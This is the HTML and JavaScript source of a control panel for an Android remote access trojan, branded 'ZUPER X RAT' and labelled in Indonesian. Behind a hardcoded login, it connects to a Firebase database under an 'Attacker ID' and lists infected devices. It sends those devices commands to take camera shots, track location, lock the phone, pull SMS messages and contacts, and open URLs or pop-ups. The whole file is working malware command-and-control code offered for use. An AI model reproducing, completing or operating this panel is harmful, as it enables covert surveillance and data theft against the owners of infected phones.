<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>ZUPER X RAT · CONTROL PANEL</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',sans-serif; }
        body {
            background: radial-gradient(circle at 20% 30%, #0a0f1e, #010101);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .login-card {
            background: rgba(0,0,0,0.85);
            backdrop-filter: blur(16px);
            border-radius: 56px;
            padding: 40px 28px;
            width: 100%;
            max-width: 360px;
            border: 2px solid #ff3300;
            text-align: center;
        }
        .logo {
            font-size: 42px;
            font-weight: 900;
            background: linear-gradient(135deg, #ff2a2a, #ffaa00);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        .sub { font-size: 14px; color: #ff8844; margin: 12px 0 20px; }
        input {
            width: 100%;
            padding: 14px;
            margin: 10px 0;
            background: #111;
            border: 1px solid #ff4422;
            border-radius: 60px;
            color: white;
            text-align: center;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 14px;
            margin-top: 16px;
            background: linear-gradient(95deg, #cc3300, #ff6622);
            border: none;
            border-radius: 60px;
            font-weight: bold;
            font-size: 18px;
            color: black;
            cursor: pointer;
        }
        button:active { transform: scale(0.97); }
        .error-msg { margin-top: 20px; color: #ff6666; font-weight: bold; }
        .dashboard {
            display: none;
            width: 100%;
            max-width: 1400px;
            margin: auto;
        }
        .header { text-align: center; margin-bottom: 30px; }
        .header h1 { background: linear-gradient(135deg, #ff2a2a, #ffaa00); -webkit-background-clip: text; background-clip: text; color: transparent; font-size: 2rem; }
        .card {
            background: rgba(0,0,0,0.7);
            backdrop-filter: blur(10px);
            border: 1px solid #ff4422;
            border-radius: 28px;
            padding: 20px;
            margin-bottom: 25px;
        }
        .card-title { font-size: 1.3rem; border-left: 5px solid #ff5722; padding-left: 12px; margin-bottom: 15px; color: #ffaa66; text-align: left; }
        .flex-row { display: flex; flex-wrap: wrap; gap: 15px; align-items: center; margin-bottom: 15px; }
        .flex-row input, .flex-row select {
            flex: 1;
            background: #1a1a2a;
            border: 1px solid #ff5722;
            padding: 10px 15px;
            border-radius: 40px;
            color: white;
            font-size: 14px;
        }
        .btn-group {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
            gap: 12px;
            margin: 20px 0;
        }
        .btn-cmd {
            background: #ff5722;
            border: none;
            border-radius: 40px;
            padding: 12px;
            font-weight: bold;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            cursor: pointer;
        }
        .btn-cmd:active { transform: scale(0.96); }
        .btn-success { background: #2e7d32; }
        .btn-danger { background: #aa2222; }
        .device-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
            gap: 12px;
            margin-top: 10px;
        }
        .device-card {
            background: #11161f;
            border: 1px solid #ff8844;
            border-radius: 20px;
            padding: 12px;
            cursor: pointer;
        }
        .device-card.selected { border: 2px solid #ffaa00; background: #2a1f1a; }
        .device-name { font-weight: bold; color: #ffaa66; }
        .device-id { font-size: 10px; color: #aaa; word-break: break-all; }
        .log-area {
            background: #000000aa;
            border-radius: 20px;
            height: 200px;
            overflow-y: auto;
            padding: 12px;
            font-family: monospace;
            font-size: 12px;
            color: #0f0;
            border: 1px solid #ff6633;
            margin-top: 15px;
        }
        .status { font-size: 12px; color: #ffaa77; margin-top: 8px; }
        hr { border-color: #ff4422; margin: 10px 0; }
    </style>
</head>
<body>
    <!-- LOGIN -->
    <div id="loginCard" class="login-card">
        <div class="logo">ZUPER X RAT</div>
        <div class="sub">Silahkan Login</div>
        <input type="text" id="loginUsername" placeholder="Username" autocomplete="off">
        <input type="password" id="loginPassword" placeholder="Password">
        <button id="loginBtn">LOGIN</button>
        <div id="loginError" class="error-msg"></div>
    </div>

    <!-- DASHBOARD -->
    <div id="dashboard" class="dashboard">
        <div class="header"><h1>ZUPER X RAT · FULL CONTROL</h1></div>
        <div class="card">
            <div class="card-title">Firebase & Attacker ID</div>
            <div class="flex-row">
                <input type="text" id="firebaseUrl" placeholder="https://...firebaseio.com/" value="">
                <input type="text" id="attackerId" placeholder="ID Attacker" value="ZUPERX_MASTER">
                <button id="connectBtn">HUBUNGKAN</button>
            </div>
            <div id="connStatus" class="status">Belum terhubung.</div>
        </div>
        <div class="card">
            <div class="card-title">Device Online</div>
            <div id="deviceListContainer" class="device-grid">Belum ada device.</div>
            <div id="selectedStatus" class="status">Klik device untuk memilih.</div>
        </div>
        <div class="card">
            <div class="card-title">Kirim Perintah</div>
            <div class="flex-row">
                <button id="sendAllBtn" class="btn-cmd btn-success">Kirim ke SEMUA</button>
                <button id="sendSelectedBtn" class="btn-cmd" style="background:#ff9800;">Kirim ke TERPILIH</button>
            </div>
            <div class="btn-group">
                <button class="btn-cmd" data-cmd="camera"><i class="fas fa-camera"></i> Kamera</button>
                <button class="btn-cmd" data-cmd="flash_on"><i class="fas fa-lightbulb"></i> Senter ON</button>
                <button class="btn-cmd" data-cmd="flash_off"><i class="fas fa-lightbulb"></i> Senter OFF</button>
                <button class="btn-cmd" data-cmd="location"><i class="fas fa-map-marker-alt"></i> Lokasi</button>
                <button class="btn-cmd" data-cmd="lock"><i class="fas fa-lock"></i> Lock HP</button>
                <button class="btn-cmd" data-cmd="sms"><i class="fas fa-envelope"></i> SMS</button>
                <button class="btn-cmd" data-cmd="contacts"><i class="fas fa-address-book"></i> Kontak</button>
                <button class="btn-cmd" data-cmd="toast"><i class="fas fa-comment"></i> Toast</button>
                <button class="btn-cmd" data-cmd="popup"><i class="fas fa-exclamation-triangle"></i> Popup</button>
            </div>
            <div class="log-area" id="logArea"><div>➡️ Login dulu.</div></div>
        </div>
    </div>

    <script>
        // -------------------- LOGIN --------------------
        const loginCard = document.getElementById('loginCard');
        const dashboardDiv = document.getElementById('dashboard');
        const loginBtn = document.getElementById('loginBtn');
        const loginUser = document.getElementById('loginUsername');
        const loginPass = document.getElementById('loginPassword');
        const loginError = document.getElementById('loginError');

        function doLogin() {
            const user = loginUser.value.trim();
            const pass = loginPass.value.trim();
            if (user === "Gilang" && pass === "Gilang") {
                // sembunyikan login, tampilkan dashboard
                loginCard.style.display = "none";
                dashboardDiv.style.display = "block";
                // panggil fungsi untuk menginisialisasi tombol dan Firebase (nanti)
                initControlPanel();
            } else {
                loginError.innerText = "Lah u siapa mbruk?";
                loginUser.value = "";
                loginPass.value = "";
            }
        }

        loginBtn.addEventListener('click', doLogin);
        loginPass.addEventListener('keypress', e => e.key === 'Enter' && doLogin());
        loginUser.addEventListener('keypress', e => e.key === 'Enter' && doLogin());

        // -------------------- DASHBOARD --------------------
        let db = null;
        let currentAttackerId = "";
        let selectedDevice = null;
        let devices = {};
        let devicesRef = null;

        function addLog(msg) {
            const logDiv = document.getElementById('logArea');
            const time = new Date().toLocaleTimeString();
            const div = document.createElement('div');
            div.innerHTML = `[${time}] ${msg}`;
            logDiv.appendChild(div);
            logDiv.scrollTop = logDiv.scrollHeight;
        }

        function renderDeviceList() {
            const container = document.getElementById('deviceListContainer');
            if (Object.keys(devices).length === 0) {
                container.innerHTML = "<div style='color:#aaa;'>Tidak ada device online.</div>";
                return;
            }
            let html = "";
            for (let id in devices) {
                const info = devices[id].info || {};
                const isSelected = (selectedDevice === id) ? "selected" : "";
                html += `
                    <div class="device-card ${isSelected}" data-id="${id}">
                        <div class="device-name">📱 ${info.name || "Device"}</div>
                        <div class="device-id">${id.substring(0,12)}...</div>
                        <button class="select-device" data-id="${id}" style="margin-top:5px;">Pilih</button>
                    </div>
                `;
            }
            container.innerHTML = html;
            // Attach event untuk tombol pilih
            document.querySelectorAll('.select-device').forEach(btn => {
                btn.addEventListener('click', (e) => {
                    e.stopPropagation();
                    const id = btn.getAttribute('data-id');
                    selectedDevice = id;
                    document.getElementById('selectedStatus').innerHTML = `✅ Device dipilih: ${id.substring(0,12)}...`;
                    renderDeviceList();
                });
            });
        }

        function listenDevices() {
            if (!db || !currentAttackerId) return;
            if (devicesRef) devicesRef.off();
            devicesRef = db.ref(`devices/${currentAttackerId}`);
            devicesRef.on('value', (snapshot) => {
                devices = snapshot.val() || {};
                renderDeviceList();
                addLog(`${Object.keys(devices).length} device online.`);
            }, (err) => addLog(`Error: ${err.message}`));
        }

        function sendCommand(action, data = "", target = null) {
            if (!db || !currentAttackerId) {
                addLog("❌ Belum terhubung ke Firebase!");
                return;
            }
            const targetDevice = target || selectedDevice || "all";
            const payload = { action, data, timestamp: Date.now(), target_device: targetDevice };
            db.ref(`commands/${currentAttackerId}`).set(payload)
                .then(() => addLog(`✅ Perintah "${action}" dikirim ke ${targetDevice === "all" ? "SEMUA" : targetDevice.substring(0,8)}`))
                .catch(err => addLog(`❌ Gagal: ${err.message}`));
        }

        function connectFirebase() {
            const url = document.getElementById('firebaseUrl').value.trim();
            const id = document.getElementById('attackerId').value.trim();
            if (!url || !id) {
                addLog("Isi URL Firebase dan ID Attacker!");
                return;
            }
            if (!url.startsWith("https://")) {
                addLog("URL harus https://");
                return;
            }
            currentAttackerId = id;
            try {
                if (db) { if (devicesRef) devicesRef.off(); }
                const fbConfig = { databaseURL: url };
                firebase.initializeApp(fbConfig);
                db = firebase.database();
                document.getElementById('connStatus').innerHTML = `✅ Terhubung, ID: ${id}`;
                addLog(`Terhubung ke Firebase, ID Attacker: ${id}`);
                listenDevices();
            } catch(e) {
                addLog(`Gagal konek: ${e.message}`);
            }
        }

        function initControlPanel() {
            // Pasang event listener setelah dashboard muncul
            document.getElementById('connectBtn').onclick = connectFirebase;
            document.getElementById('sendAllBtn').onclick = () => {
                const cmd = document.getElementById('customCmdSelect') ? document.getElementById('customCmdSelect').value : 'toast';
                const data = document.getElementById('extraData') ? document.getElementById('extraData').value : '';
                sendCommand(cmd, data, "all");
            };
            document.getElementById('sendSelectedBtn').onclick = () => {
                if (!selectedDevice) { addLog("Pilih device dulu!"); return; }
                const cmd = document.getElementById('customCmdSelect') ? document.getElementById('customCmdSelect').value : 'toast';
                const data = document.getElementById('extraData') ? document.getElementById('extraData').value : '';
                sendCommand(cmd, data, selectedDevice);
            };
            // Untuk tombol perintah yang sudah ada data-cmd
            document.querySelectorAll('.btn-cmd[data-cmd]').forEach(btn => {
                btn.addEventListener('click', () => {
                    const cmd = btn.getAttribute('data-cmd');
                    const data = document.getElementById('extraData') ? document.getElementById('extraData').value : '';
                    sendCommand(cmd, data);
                });
            });
            // Tambahkan elemen extraData dan customCmdSelect jika belum ada (saya tambahkan di dashboard)
            // Tapi karena di dashboard saya belum menambahkan custom command, saya tambahkan sekarang
            const lastCard = document.querySelector('.card:last-child');
            if (!document.getElementById('extraData')) {
                const divFlex = document.createElement('div');
                divFlex.className = 'flex-row';
                divFlex.innerHTML = `
                    <input type="text" id="extraData" placeholder="Data tambahan (pesan/URL)" style="flex:2;">
                    <select id="customCmdSelect" style="flex:1;">
                        <option value="popup">Popup</option>
                        <option value="toast">Toast</option>
                        <option value="open_url">Buka URL</option>
                    </select>
                    <button id="sendCustomCmd" class="btn-cmd" style="background:#555;">Kirim Custom</button>
                `;
                lastCard.appendChild(divFlex);
                document.getElementById('sendCustomCmd').onclick = () => {
                    let cmd = document.getElementById('customCmdSelect').value;
                    let data = document.getElementById('extraData').value;
                    if (cmd === "open_url" && data && !data.startsWith("http")) data = "https://" + data;
                    if (!data && (cmd === "popup" || cmd === "toast" || cmd === "open_url")) {
                        addLog("Isi data untuk perintah ini!");
                        return;
                    }
                    sendCommand(cmd, data);
                };
            }
        }
    </script>
</body>
                    </html>
